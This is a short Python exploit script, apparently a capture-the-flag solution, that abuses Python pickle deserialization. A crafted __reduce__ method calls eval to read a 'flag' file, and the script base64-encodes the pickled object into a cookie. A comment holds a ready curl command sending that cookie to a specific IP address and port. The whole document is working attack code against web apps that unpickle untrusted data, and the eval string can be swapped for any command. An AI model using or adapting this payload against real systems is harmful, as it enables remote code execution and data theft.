import pickle
import base64
class Exploit(object):
	def __reduce__(self):
		return eval, ("open('flag','r').read()", )

def sendPayload(payload):
	headers = {"Cookie": "data=" + base64.urlsafe_b64encode(payload).decode()}
	print(headers)

sendPayload(pickle.dumps(Exploit(), protocol=2))
""" curl -v -H "Cookie: data=gAJjX19idWlsdGluX18KZXZhbApxAFgXAAAAb3BlbignZmxhZycsJ3InKS5yZWFkKClxAYVxAlJxAy4=" http://35.198.135.192:30229/dashboard"""
